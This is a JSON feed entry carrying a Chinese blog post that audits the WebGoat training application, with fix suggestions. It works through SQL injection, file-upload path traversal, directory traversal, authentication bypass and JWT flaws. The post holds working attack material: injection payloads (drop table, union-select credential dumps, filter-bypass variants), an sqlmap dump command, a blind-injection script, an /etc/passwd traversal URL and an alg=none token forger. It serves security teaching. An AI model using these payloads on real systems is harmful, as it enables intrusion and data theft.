            "id": "http://example.com/2021/01/28/webgoat%E5%AE%A1%E8%AE%A1/",
            "url": "http://example.com/2021/01/28/webgoat%E5%AE%A1%E8%AE%A1/",
            "title": "webgoat审计",
            "date_published": "2021-01-28T01:28:50.000Z",
            "content_html": "<h1 id=\"搭建概述\"><a class=\"markdownIt-Anchor\" href=\"#搭建概述\">#</a> 搭建概述</h1>\n<p>前提：</p>\n<ul>\n<li>Java 11</li>\n<li>Maven &gt; 3.2.1</li>\n<li>IDEA</li>\n</ul>\n<p>下载源码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/WebGoat/WebGoat.git</span><br></pre></td></tr></table></figure>\n<p>打开 idea 导入 maven 项目，build 完成之后，打开 localhost:8080/WebGoat，注册账户</p>\n<h1 id=\"sql注入\"><a class=\"markdownIt-Anchor\" href=\"#sql注入\">#</a> Sql 注入</h1>\n<p>select department from employees where first_name=‘Bob’</p>\n<p>update employees set department=‘Sales’ where first_name=‘Barnett’</p>\n<p>alter table employees add column phone varchar(20)</p>\n<p>grant alter table to UnauthorizedUser</p>\n<p>12:’; update employees set salary=1000000 where last_name=‘Smith’;–</p>\n<p>13:’; drop table access_log;-- -</p>\n<h2 id=\"漏洞描述\"><a class=\"markdownIt-Anchor\" href=\"#漏洞描述\">#</a> 漏洞描述</h2>\n<p>当应用程序将用户输入的内容，拼接到 SQL 语句中，一起提交给数据库执行时，就会产生 SQL 注入威胁。攻击者通过控制部分 SQL 语句，可以查询数据库中任何需要的数据，利用数据库的一些特性，甚至可以直接获取数据库服务器的系统权限。</p>\n<h2 id=\"漏洞成因\"><a class=\"markdownIt-Anchor\" href=\"#漏洞成因\">#</a> 漏洞成因</h2>\n<p>字符拼接的方式拼接 sql 语句，并且没有做任何过滤直接执行</p>\n<h2 id=\"代码片段以及修复建议\"><a class=\"markdownIt-Anchor\" href=\"#代码片段以及修复建议\">#</a> 代码片段以及修复建议</h2>\n<ol>\n<li>\n<p>sql-injection–&gt;SQLInjectionChanllenge</p>\n<p>使用预编译 PrepareStatement，实现数据代码分离</p>\n<p><img src=\"sql1.png\" alt=\"\"></p>\n<p>测试截图：</p>\n<p>根据代码找到注入点，用 sqlmap 跑，payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap.py -r 1.txt --method PUT --data &quot;username_reg&quot; -D PUBLIC -T CHALLENGE_USERS -C password --dump</span><br></pre></td></tr></table></figure>\n<p>但是可能由于服务器的原因，跑了很久，还跑错了，密码应该是 thisisasecretfortomonly</p>\n<p><img src=\"sql9.png\" alt=\"\"></p>\n</li>\n<li>\n<p>sql-injection–&gt;SQLInjectionLesson6a</p>\n<p>使用预编译 PrepareStatement，实现数据代码分离<img src=\"sql2.png\" alt=\"\"></p>\n<p>测试截图：</p>\n<p>payload (注意字段类型要对应)：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1&#x27; union select userid,user_name,password, cookie,&#x27;&#x27;,&#x27;&#x27;,0 from user_system_data --</span><br></pre></td></tr></table></figure>\n<p><img src=\"sql8.png\" alt=\"\"></p>\n</li>\n<li>\n<p>sql-injection–&gt;Servers</p>\n<p>列名不能加双引号，所以只能用字符拼接的方式拼接 sql 语句，建议对列名进行白名单过滤</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@ResponseBody</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> List&lt;Server&gt; <span class=\"title\">sort</span><span class=\"params\">(<span class=\"meta\">@RequestParam</span> String column)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        List&lt;Server&gt; servers = <span class=\"keyword\">new</span> ArrayList&lt;&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span> (Connection connection = dataSource.getConnection();</span><br><span class=\"line\">             PreparedStatement preparedStatement = connection.prepareStatement(<span class=\"string\">&quot;select id, hostname, ip, mac, status, description from servers  where status &lt;&gt; &#x27;out of order&#x27; order by &quot;</span> + column)) &#123;</span><br><span class=\"line\">            ResultSet rs = preparedStatement.executeQuery();</span><br><span class=\"line\">            <span class=\"keyword\">while</span> (rs.next()) &#123;</span><br><span class=\"line\">                Server server = <span class=\"keyword\">new</span> Server(rs.getString(<span class=\"number\">1</span>), rs.getString(<span class=\"number\">2</span>), rs.getString(<span class=\"number\">3</span>), rs.getString(<span class=\"number\">4</span>), rs.getString(<span class=\"number\">5</span>), rs.getString(<span class=\"number\">6</span>));</span><br><span class=\"line\">                servers.add(server);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> servers;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"sql4.png\" alt=\"\"></p>\n<p>测试截图:</p>\n<p>sqlmap 不太好使，太慢了，然后就看见大佬写的脚本</p>\n<p>布尔盲注，根据返回数据的排序来判断真假 (tql)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> string <span class=\"keyword\">import</span> digits</span><br><span class=\"line\">chars = digits+<span class=\"string\">&quot;.&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;X-Requested-With&#x27;</span>: <span class=\"string\">&#x27;XMLHttpRequest&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">cookies = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;JSESSIONID&#x27;</span>: <span class=\"string\">&#x27;D81iy9aS29fcA8JZUl1QEdeNBahRWoMFk8YyziGj&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;JSESSIONID.75fbd09e&#x27;</span>: <span class=\"string\">&#x27;7mc1x9iei6ji4xo2a3u4kbz1&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">i = <span class=\"number\">0</span></span><br><span class=\"line\">result = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">proxy=&#123;<span class=\"string\">&quot;http&quot;</span>: <span class=\"string\">&quot;http://127.0.0.1:6666&quot;</span>&#125;</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    i += <span class=\"number\">1</span></span><br><span class=\"line\">    temp = result</span><br><span class=\"line\">    <span class=\"keyword\">for</span> char <span class=\"keyword\">in</span> chars:</span><br><span class=\"line\">        vul_url = <span class=\"string\">&quot;http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=case%20when%20(select%20substr(ip,&#123;0&#125;,1)=&#x27;&#123;1&#125;&#x27;%20from%20servers%20where%20hostname=&#x27;webgoat-prd&#x27;)%20then%20hostname%20else%20mac%20end&quot;</span>.<span class=\"built_in\">format</span>(i, char)</span><br><span class=\"line\">        resp = requests.get(vul_url, headers=headers, cookies=cookies, proxies=proxy)</span><br><span class=\"line\">        <span class=\"comment\"># print(resp.json())</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&#x27;webgoat-acc&#x27;</span> <span class=\"keyword\">in</span> resp.json()[<span class=\"number\">0</span>][<span class=\"string\">&#x27;hostname&#x27;</span>]:</span><br><span class=\"line\">            result += char</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(result)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> temp == result:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;select * from table where </span></span><br><span class=\"line\"><span class=\"string\">column = </span></span><br><span class=\"line\"><span class=\"string\">case</span></span><br><span class=\"line\"><span class=\"string\">when (select substr(ip,&#123;0&#125;,1) = &#x27;&#123;1&#125;&#x27; from server where  hostname = &#x27;webgoat-prd&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">then hostname</span></span><br><span class=\"line\"><span class=\"string\">else mac end&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"sql12.png\" alt=\"\"></p>\n</li>\n<li>\n<p>sql-injection–&gt;SqlOnlyInputValidation</p>\n<p>限制用户输入内容不能包含空格，但是可以通过过 /**/ 注释，括号等绕过，过滤空格后直接调用 SQLInjectionLesson6a 的注入函数（字符拼接执行并直接输出结果），修复建议同 SQLInjectionLesson6a</p>\n<p><img src=\"sql5.png\" alt=\"\"></p>\n<p>测试截图：</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1&#x27;/**/union/**/select/**/userid,user_name,password,cookie,&#x27;&#x27;,&#x27;&#x27;,0/**/from/**/user_system_data/**/--/**/</span><br></pre></td></tr></table></figure>\n<p><img src=\"sql10.png\" alt=\"\"></p>\n</li>\n<li>\n<p>sql-injection–&gt;SqlOnlyInputValidationOnKeywords</p>\n<p>对用户输入进行关键字’select’ 'from’进行了一次判断置空，并限制用户输入不能包含空格，可以通过双写 + 注释绕过绕过，建议使用预编译</p>\n<p><img src=\"sql6.png\" alt=\"\"></p>\n<p>测试截图：</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1&#x27;/**/union/**/selecselectt/**/userid,user_name,password,cookie,&#x27;&#x27;,&#x27;&#x27;,0/**/frfromom/**/user_system_data/**/--/**/</span><br></pre></td></tr></table></figure>\n<p><img src=\"sql11.png\" alt=\"\"></p>\n</li>\n</ol>\n<h1 id=\"任意文件上传\"><a class=\"markdownIt-Anchor\" href=\"#任意文件上传\">#</a> 任意文件上传</h1>\n<h2 id=\"漏洞描述-2\"><a class=\"markdownIt-Anchor\" href=\"#漏洞描述-2\">#</a> 漏洞描述</h2>\n<p>文件上传功能允许用户将本地的文件通过 Web 页面提交到网站服务器上，但是如果不对用户上传的文件进行合法性验证，则攻击者可利用 Web 应用系统文件上传功能（如文件上传、图像上传等）的代码缺陷来上传任意文件或者 webshell，并在服务器上运行，以达到获取 Web 应用系统控制权限或其他目的。</p>\n<h2 id=\"漏洞成因-2\"><a class=\"markdownIt-Anchor\" href=\"#漏洞成因-2\">#</a> 漏洞成因</h2>\n<p>未对用户输入的参数进行合法性验证</p>\n<h2 id=\"代码片段以及修复建议-2\"><a class=\"markdownIt-Anchor\" href=\"#代码片段以及修复建议-2\">#</a> 代码片段以及修复建议</h2>\n<ol>\n<li>\n<p>path-traversal–&gt;ProfileUpload</p>\n<p>获取前端上传的文件以及字符串 “fullName”</p>\n</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@PostMapping(value = &quot;/PathTraversal/profile-upload&quot;, consumes = ALL_VALUE, produces = APPLICATION_JSON_VALUE)</span></span><br><span class=\"line\"> <span class=\"meta\">@ResponseBody</span></span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">public</span> AttackResult <span class=\"title\">uploadFileHandler</span><span class=\"params\">(<span class=\"meta\">@RequestParam(&quot;uploadedFile&quot;)</span> MultipartFile file, <span class=\"meta\">@RequestParam(value = &quot;fullName&quot;, required = false)</span> String fullName)</span> </span>&#123;</span><br><span class=\"line\">     <span class=\"keyword\">return</span> <span class=\"keyword\">super</span>.execute(file, fullName);</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>调用父类 ProfileUploadBase，execute () 方法，判断文件和 &quot;fullName&quot; 非空后直接上传，并且 “fullName” 用作子路径名字符串</p>\n<p><img src=\"sql7.png\" alt=\"\"></p>\n<p>修复建议</p>\n<ol>\n<li>对 fullName 进行判断过滤</li>\n<li>使用适当的权限保护文件夹</li>\n<li>随机化重命名用户上传的文件名</li>\n<li>根据用户上传的文件类型重构文件</li>\n</ol>\n<p>测试截图：</p>\n<p><img src=\"pt01.png\" alt=\"\"><img src=\"pt02.png\" alt=\"\"></p>\n<ol start=\"2\">\n<li>path-traversal–&gt;ProfileUploadFix</li>\n</ol>\n<p>对 “fullName” 过滤了 “…/”，但是因为 replace 并不能递归检测，所以可以通过双写绕过 (’…/./’)，修复建议同上</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> AttackResult <span class=\"title\">uploadFileHandler</span><span class=\"params\">(            <span class=\"meta\">@RequestParam(&quot;uploadedFileFix&quot;)</span> MultipartFile file,            <span class=\"meta\">@RequestParam(value = &quot;fullNameFix&quot;, required = false)</span> String fullName)</span> </span>&#123;        <span class=\"keyword\">return</span> <span class=\"keyword\">super</span>.execute(file, fullName != <span class=\"keyword\">null</span> ? fullName.replace(<span class=\"string\">&quot;../&quot;</span>, <span class=\"string\">&quot;&quot;</span>) : <span class=\"string\">&quot;&quot;</span>);    &#125;</span><br></pre></td></tr></table></figure>\n<p>测试截图：</p>\n<p><img src=\"pt03.png\" alt=\"\"></p>\n<p><img src=\"pt04.png\" alt=\"\"></p>\n<ol start=\"3\">\n<li>path-traversal–&gt;ProfileUploadRemoveUserInput</li>\n</ol>\n<p>直接使用了源文件名，所以直接修改文件名即可，建议随机重命名文件名</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> AttackResult <span class=\"title\">uploadFileHandler</span><span class=\"params\">(<span class=\"meta\">@RequestParam(&quot;uploadedFileRemoveUserInput&quot;)</span> MultipartFile file)</span> </span>&#123;        <span class=\"keyword\">return</span> <span class=\"keyword\">super</span>.execute(file, file.getOriginalFilename());    &#125;</span><br></pre></td></tr></table></figure>\n<p>测试截图：</p>\n<p><img src=\"pt05.png\" alt=\"\"></p>\n<p><img src=\"pt06.png\" alt=\"\"></p>\n<h1 id=\"目录遍历\"><a class=\"markdownIt-Anchor\" href=\"#目录遍历\">#</a> 目录遍历</h1>\n<h2 id=\"漏洞描述-3\"><a class=\"markdownIt-Anchor\" href=\"#漏洞描述-3\">#</a> 漏洞描述</h2>\n<p>路径遍历，即利用路径回溯符 “…/” 跳出程序本身的限制目录实现下载任意文件。例如 Web 应用源码目录、Web 应用配置文件、敏感的系统文件（/etc/passwd、/etc/paswd）等。</p>\n<p>一个正常的 Web 功能请求：</p>\n<p><a href=\"http://www.test.com/get-files.jsp?file=report.pdf\">http://www.test.com/get-files.jsp?file=report.pdf</a></p>\n<p>如果 Web 应用存在路径遍历漏洞，则攻击者可以构造以下请求服务器敏感文件：</p>\n<p><a href=\"http://www.test.com/get-files.jsp?file=../../../../../../../../../../../../etc/passwd\">http://www.test.com/get-files.jsp?file=../../../../../../../../../../../../etc/passwd</a></p>\n<h2 id=\"漏洞成因-3\"><a class=\"markdownIt-Anchor\" href=\"#漏洞成因-3\">#</a> 漏洞成因</h2>\n<p>未对用户输入的参数进行合法性验证</p>\n<h2 id=\"代码片段以及修复建议-3\"><a class=\"markdownIt-Anchor\" href=\"#代码片段以及修复建议-3\">#</a> 代码片段以及修复建议</h2>\n<p>path-traversal–&gt;ProfileUploadRetrieval</p>\n<p>源码过滤了’…‘和’/’，但是可以通过 url 编码进行绕过</p>\n<p>根据参数 id 进行判断</p>\n<p><img src=\"pt08.png\" alt=\"\"></p>\n<p>如果用户输入的 id.jpg 存在，那么返回包中返回该图片的 base64 编码</p>\n<p>如果不存在，就返回 catPicturesDirectory 的父目录的所有文件信息，用逗号分割</p>\n<p><img src=\"pt09.png\" alt=\"\"></p>\n<p>测试截图：</p>\n<p><img src=\"pt07.png\" alt=\"\"></p>\n<p>修复建议：</p>\n<pre><code>1. 使用适当的权限保护文件夹2. 禁止返回目录信息3. 对url编码后的参数也要进行解码过滤4. 统一404界面\n</code></pre>\n<h1 id=\"身份认证绕过\"><a class=\"markdownIt-Anchor\" href=\"#身份认证绕过\">#</a> 身份认证绕过</h1>\n<h2 id=\"漏洞描述-4\"><a class=\"markdownIt-Anchor\" href=\"#漏洞描述-4\">#</a> 漏洞描述</h2>\n<p>业务流程由前端进行控制，服务器端对应的各功能分离，导致业务流程可被攻击者进行控制，从而绕过流程中的各项校验功能，达到攻击的目的。</p>\n<h2 id=\"漏洞成因-4\"><a class=\"markdownIt-Anchor\" href=\"#漏洞成因-4\">#</a> 漏洞成因</h2>\n<p>未对用户可控的参数进行合法性验证</p>\n<h2 id=\"代码片段以及修复建议-4\"><a class=\"markdownIt-Anchor\" href=\"#代码片段以及修复建议-4\">#</a> 代码片段以及修复建议</h2>\n<ol>\n<li>\n<p>auth-bypass–&gt;VerifyAccount.completed()</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (verificationHelper.didUserLikelylCheat((HashMap) submittedAnswers)) &#123;            <span class=\"keyword\">return</span> failed(<span class=\"keyword\">this</span>)                    .feedback(<span class=\"string\">&quot;verify-account.cheated&quot;</span>)                    .output(<span class=\"string\">&quot;Yes, you guessed correctly, but see the feedback message&quot;</span>)                    .build();        &#125;</span><br></pre></td></tr></table></figure>\n<p>调用 verificationHelper.didUserLikelylCheat ()</p>\n<p>将用户输入的问题用键值对的方式保存，并和后端代码存储的答案进行比较。</p>\n<p>但是 Mapper 在 get 一个不存在的键时，并不会报错，而是返回 null。所以用户可以通过控制 key 的值绕过。</p>\n<p>建议</p>\n<ol>\n<li>若用户可控 key，那么应该先判断这个 key 是否合法</li>\n<li>设置不可控 key，直接将用户的输入作为 value 进行判断</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">static</span> &#123;        userSecQuestions.put(<span class=\"string\">&quot;secQuestion0&quot;</span>, <span class=\"string\">&quot;Dr. Watson&quot;</span>);        userSecQuestions.put(<span class=\"string\">&quot;secQuestion1&quot;</span>, <span class=\"string\">&quot;Baker Street&quot;</span>);    &#125;    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> Map&lt;Integer, Map&gt; secQuestionStore = <span class=\"keyword\">new</span> HashMap&lt;&gt;();    <span class=\"keyword\">static</span> &#123;        secQuestionStore.put(verifyUserId, userSecQuestions);    &#125;    <span class=\"comment\">// end &#x27;data store set up&#x27;    // this is to aid feedback in the attack process and is not intended to be part of the &#x27;vulnerable&#x27; code    public boolean didUserLikelylCheat(HashMap&lt;String, String&gt; submittedAnswers) &#123;        boolean likely = false;        if (submittedAnswers.size() == secQuestionStore.get(verifyUserId).size()) &#123;            likely = true;        &#125;        if ((submittedAnswers.containsKey(&quot;secQuestion0&quot;) &amp;&amp; submittedAnswers.get(&quot;secQuestion0&quot;).equals(secQuestionStore.get(verifyUserId).get(&quot;secQuestion0&quot;)))                &amp;&amp; (submittedAnswers.containsKey(&quot;secQuestion1&quot;) &amp;&amp; submittedAnswers.get(&quot;secQuestion1&quot;).equals(secQuestionStore.get(verifyUserId).get(&quot;secQuestion1&quot;)))) &#123;            likely = true;        &#125; else &#123;            likely = false;        &#125;        return likely;</span></span><br></pre></td></tr></table></figure>\n<p>测试截图：</p>\n<p><img src=\"ap01.png\" alt=\"\"></p>\n</li>\n<li>\n<p>auth-bypass–&gt;AccountVerificationHelper.verifyAccount()</p>\n<p>判断了 key 是否存在，但是不包含该 key 仍然可以绕过</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//end of cheating check ... the method below is the one of real interest. Can you find the flaw?    public boolean verifyAccount(Integer userId, HashMap&lt;String, String&gt; submittedQuestions) &#123;        //short circuit if no questions are submitted        if (submittedQuestions.entrySet().size() != secQuestionStore.get(verifyUserId).size()) &#123;            return false;        &#125;        if (submittedQuestions.containsKey(&quot;secQuestion0&quot;) &amp;&amp; !submittedQuestions.get(&quot;secQuestion0&quot;).equals(secQuestionStore.get(verifyUserId).get(&quot;secQuestion0&quot;))) &#123;            return false;        &#125;        if (submittedQuestions.containsKey(&quot;secQuestion1&quot;) &amp;&amp; !submittedQuestions.get(&quot;secQuestion1&quot;).equals(secQuestionStore.get(verifyUserId).get(&quot;secQuestion1&quot;))) &#123;            return false;        &#125;        // else        return true;    &#125;</span></span><br></pre></td></tr></table></figure>\n<p>建议修改为</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (submittedQuestions.entrySet().size() != secQuestionStore.get(verifyUserId).size()) &#123;            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;        &#125;<span class=\"comment\">// 同时判断key和对应的value        if (submittedQuestions.containsKey(&quot;secQuestion0&quot;) &amp;&amp; submittedQuestions.get(&quot;secQuestion0&quot;).equals(secQuestionStore.get(verifyUserId).get(&quot;secQuestion0&quot;)) &amp;&amp; submittedQuestions.containsKey(&quot;secQuestion1&quot;) &amp;&amp; submittedQuestions.get(&quot;secQuestion1&quot;).equals(secQuestionStore.get(verifyUserId).get(&quot;secQuestion1&quot;))) &#123;            return true;        &#125;        // else        return false;</span></span><br></pre></td></tr></table></figure>\n<p>作者没写这个功能点，就是在源码里面问了一下</p>\n</li>\n<li>\n<p>JWT</p>\n<p>jwt–&gt;JWTVotesEndpoint.vote()</p>\n<p>没有验证签名，直接判断 token 中的 admin 对应值是否为 true，所以把 token 中的 alg 设置为 none，admin 设置为 true 即可（亲测 bp 转换的不行）</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (StringUtils.isEmpty(accessToken)) &#123;            <span class=\"keyword\">return</span> failed(<span class=\"keyword\">this</span>).feedback(<span class=\"string\">&quot;jwt-invalid-token&quot;</span>).build();        &#125; <span class=\"keyword\">else</span> &#123;            <span class=\"keyword\">try</span> &#123;                Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);                Claims claims = (Claims) jwt.getBody();                <span class=\"keyword\">boolean</span> isAdmin = Boolean.valueOf((String) claims.get(<span class=\"string\">&quot;admin&quot;</span>));                <span class=\"keyword\">if</span> (!isAdmin) &#123;                    <span class=\"keyword\">return</span> failed(<span class=\"keyword\">this</span>).feedback(<span class=\"string\">&quot;jwt-only-admin&quot;</span>).build();                &#125; <span class=\"keyword\">else</span> &#123;                    votes.values().forEach(vote -&gt; vote.reset());                    <span class=\"keyword\">return</span> success(<span class=\"keyword\">this</span>).build();                &#125;            &#125; <span class=\"keyword\">catch</span> (JwtException e) &#123;                <span class=\"keyword\">return</span> failed(<span class=\"keyword\">this</span>).feedback(<span class=\"string\">&quot;jwt-invalid-token&quot;</span>).output(e.toString()).build();            &#125;        &#125;</span><br></pre></td></tr></table></figure>\n<p>转换脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-import jwtimport base64# header# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9# &#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;#payload eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTUwNDAwNjQzNSwiZXhwIjoxNTA0MDA2NTU1LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0# &#123;&quot;iss&quot;:&quot;http:\\/\\/demo.sjoerdlangkemper.nl\\/&quot;,&quot;iat&quot;:1504006435,&quot;exp&quot;:1504006555,&quot;data&quot;:&#123;&quot;hello&quot;:&quot;world&quot;&#125;&#125;def b64urlencode(data):    return base64.b64encode(data).replace(b&#x27;+&#x27;, b&#x27;-&#x27;).replace(b&#x27;/&#x27;, b&#x27;_&#x27;).replace(b&#x27;=&#x27;, b&#x27;&#x27;)print(b64urlencode(b&#x27;&#123;&quot;alg&quot;:&quot;none&quot;&#125;&#x27;)+b&#x27;.&#x27;+b64urlencode(b&#x27;&#123;&quot;iat&quot;:1673470025,&quot;admin&quot;:&quot;true&quot;,&quot;user&quot;:&quot;Tom&quot;&#125;&#x27;)+b&#x27;.&#x27;)</span></span><br></pre></td></tr></table></figure>\n<p>测试截图：</p>\n<p><img src=\"pt10.png\" alt=\"\"></p>\n<p>jwt–&gt;JWTSecretKeyEndpoint.login()</p>\n<p>随机取数组中的值进行加密，可以用字典进行爆破</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> String[] SECRETS = &#123;<span class=\"string\">&quot;victory&quot;</span>, <span class=\"string\">&quot;business&quot;</span>, <span class=\"string\">&quot;available&quot;</span>, <span class=\"string\">&quot;shipping&quot;</span>, <span class=\"string\">&quot;washington&quot;</span>&#125;;<span class=\"keyword\">static</span> <span class=\"keyword\">final</span> String JWT_SECRET = TextCodec.BASE64.encode(SECRETS[<span class=\"keyword\">new</span> Random().nextInt(SECRETS.length)]);<span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">getSecretToken</span><span class=\"params\">()</span> </span>&#123;        <span class=\"keyword\">return</span> Jwts.builder()                .setIssuer(<span class=\"string\">&quot;WebGoat Token Builder&quot;</span>)                .setAudience(<span class=\"string\">&quot;webgoat.org&quot;</span>)                .setIssuedAt(Calendar.getInstance().getTime())                .setExpiration(Date.from(Instant.now().plusSeconds(<span class=\"number\">60</span>)))                .setSubject(<span class=\"string\">&quot;tom@webgoat.org&quot;</span>)                .claim(<span class=\"string\">&quot;username&quot;</span>, <span class=\"string\">&quot;Tom&quot;</span>)                .claim(<span class=\"string\">&quot;Email&quot;</span>, <span class=\"string\">&quot;tom@webgoat.org&quot;</span>)                .claim(<span class=\"string\">&quot;Role&quot;</span>, <span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;Manager&quot;</span>, <span class=\"string\">&quot;Project Administrator&quot;</span>&#125;)                .signWith(SignatureAlgorithm.HS256, JWT_SECRET).compact();    &#125;</span><br></pre></td></tr></table></figure>\n<p>爆破脚本（字典 pass.txt 用的是源码里面的数组）（如果脚本报错 jwt 找不到 jwt.exceptions，可能是 pyjwt 的问题，更新 pyjwt&gt;=1.6.4 即可，<a href=\"https://stackoverflow.com/questions/33198428/jwt-module-object-has-no-attribute-encode\">解决来源</a>）：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> termcolorimport jwtif __name__ == <span class=\"string\">&quot;__main__&quot;</span>:    jwt_str = <span 